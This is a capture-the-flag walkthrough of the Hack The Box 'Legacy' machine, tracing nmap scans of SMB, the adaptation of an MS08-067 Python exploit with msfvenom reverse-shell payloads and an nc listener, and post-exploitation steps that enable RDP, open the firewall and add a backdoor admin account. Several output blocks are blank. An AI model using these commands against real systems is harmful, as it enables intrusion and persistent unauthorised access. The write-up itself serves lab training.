Walkthrough for Legacy: 10.10.10.4 - The Try Harder Way!

## Enumeration

first we assign the ip addresses to a local variables:
 
``` bash
LEGACY=10.10.10.4
ATTACK=10.10.14.34
```
 
First we run the nmap scan to identify the running services:
 
``` bash
nmap $LEGACY
```
this returns an error:
 
```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```
 
We know the service is up, let's avoid using the ping
 
```
nmap $LEGACY -Pn
```
 
That's better now we get an output:
 
```
Nmap scan report for 10.10.10.4
Host is up (0.046s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
```

Immediately, this box looks like a windows box, port 3389 is typically used for Windows RDP and ports 139 and 445 suggest SMB.

RDP is the TCP service windows uses to allow remote login. RDP traditionally has a few isues that we can exploit but is typically a slow system to attack with no prior credentials.

SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack which allows SMB to work over the internet. The supporting ports 137 on UDP and TCP (name service) and 138 on UDP (datagram) are used for NetBIOS on the WinTEL stack. SMB has been plagued with issues, if we find an older version here we could be on to an easy win.

Let's kick it up a notch and go into a targeted aggressive scan:
 
``` bash
sudo nmap $LEGACY -Pn -p U:137,138,3389,T:137,139,445,3389 -A
```
gives us more verbose reading

Time for some triage.
 
 
## Triage
 


Looking at SMB I can see the version looks like smb2 on Windows, maybe Windows XP.
There are alot of potential exploits that pop up if we run a `searchsploit smb windows` so lets try to narrow the field a bit with more scanning. Nmap has a number of microsoft vulnerablity checks included in it's engine that all start with _smb-vuln-_, lets try and see what we can find:

``` bash
nmap $LEGACY -Pn -p 139,445 --script=smb-vuln-*
```

Interesting we get the following:

```

Looks like 2 winners:

1. smb-vuln-ms08-067
2. smb-vuln-ms17-010
 
We'll look at smb-vuln-ms08-067 first as smb-vuln-ms17-010 carries high risk.
 
``` bash
searchsploit ms08-067
```

There are a few to choose from:

## Exploit
 
With the metasploit script available, this looks like a point and shoot exploit. Lets try a bit harder and run a manual attack this time. Lets check out the first one on the list:

``` bash
searchsploit 40279.py -x
```

Combing through the code this looks like a mature exploit, it is a python rework of [7132.py](https://www.exploit-db.com/exploits/7132/) also on the list. 

I run a mirror copy to my current directory:

``` bash
searchsploit 40279.py -m
```

When we attempt a re-write of a manual exploit we need to have a good idea that the exploit is compatible with our target and that there are no errors. Glancing through this it looks like the author has made consession for different OS versions and languages. As our nmap script is favoring XP it looks like option 1 is the good option on line 204:

``` python
print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
```

Lines 79 to 179 appears to be the exploit code for a Buffer Overflow against the SMB service. At this stage we don't care about that. If we make the assumption that the exploit works, we only care about triggering malicious code to work with our setup. This code is executed in the shellcode variable.

line 45 explains how this is generated with the msfvenom tool:

``` python
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
```
 
The output of this is said to be 380 bytes as per line 43 and this doesn't include the required nop slide to trigger. 

But what does the tool actually do? In this case it generates a meterpreter reverse tcp shell payload for Windows. The reverse shell is sent to host 192.168.30.77 on port 443. The author has specified a thread EXITFUNC which allows the payload to execute the shellcode in a sub-thread helping the service recover should we exit. the -b flag highlights the bad characters we want to avoid in the exploit buffer and we specify a python format.

A thing to be aware of is that a lot of public exploit code has errors in it, some of it will even brick your machine because people are bad that way. So lets check the payload for ourselves by running the msfvenom command above:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 388 (iteration=0)
x86/call4_dword_xor chosen with final size 388
Payload size: 388 bytes
Final size of python file: 1862 bytes

# payload redacted
```

Note the payload size is 388 bytes, not 380 as advertised. This is a little worring but we can press forward with our own smaller windows reverse shell payload: 

```
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
```

Payload size is now 348 bytes, 32 lower than the original exploit now lets consider the nopslide.
The \x90 operation corresponds to a NOP (No Operation) value in the shellcode variable.

Counting through the value we see 47 \x90s in the code and another issue, the shellcode variable re-declares itself on lines 46-48:

``` python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" #first decleration
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" #second decleration
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" #first append, rest of code is as expected.
```

We'll assume the exploit needs 380 bytes and err on the side of caution and assume the exploit worked as submitted go with an orignal NOP sled size of 30 bytes meaning that when we include the additional 32 bytes for our shellcode reduction we need an additional 62 bytes giving us the following command to generate the shellcode:


```
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -n 62
```

gives us:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload

```

After replacing the shellcode variable in the exploit with the one we generated, we can set up a reverse shell with nc:

``` bash
nc -nvlp 443
```

In a seperate terminal window we can launch the exploit, but before we do we need to consider the runtime arguments. As per the example in line 208 the syntax is `<script> <target> <target os>` like so:

``` python
print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
```

Checking through the source code we see the numbers correspond to different OS versions which will select appropriate return addresses for our exploit to run.

Going back to our aggressive nmap scan we can determine the target OS is __Microsoft Windows XP SP3 (94%)__
 which is option 6 (line 149) offers the closest match to.

to run the exploit we use:

``` bash
python 40279.py $LEGACY 6
````

this appears to run the exploit successfuly:

After a moment we have a system shell in the other terminal:

```

```

Early Windows XP doesn't have whoami, lets check who we are:

``` cmd
echo %computername%\%username%
```

gives us

```
LEGACY\%username%

```

Looks like there is no %username% variable for this user, I think we might be system.
When I check for the root flag, I can find it I can grab the flags and submit.

W00tW00t!

## Bonus Getting RDP.

Remeber RDP from earlier? Now that I have system access lets get a full RDP session for the lolz.

Checking back to our port scan with nmap I see that 3389 is closed, we need to open it and potentially set a couple of reg keys to get access. As system we also do not have a password to login with, we will need to take of that as well.

First lets take care of the RDP, by explicitly enabling the service (stricly not required here, but useful reference)

``` cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v Netsh.exe
```

outputs

```
The operation completed successfully

```

Disable the deny connections:

``` cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

and for good measure poke a hole in the firewall:

``` cmd
netsh firewall add portopening TCP 3389 " Remote Desktop"
```

works with the output:

```
Ok.
```

back to our original linux terminal we check the changes with rdp:

``` bash
rdesktop $LEGACY
```

It worked!

![legacy_rdp.png](/assets/htb_stuff/legacy/legacy_rdp.png)

Now for a login. As system we can do back to our shell just create an admin user and password with the following 2 lines of code:

```
net user pwnd Pa$$w0rd /ADD
net localgroup administrators pwnd /add
```

which we can login with:


![pwnd.png](/assets/htb_stuff/legacy/pwnd.png)

And it is PWND!
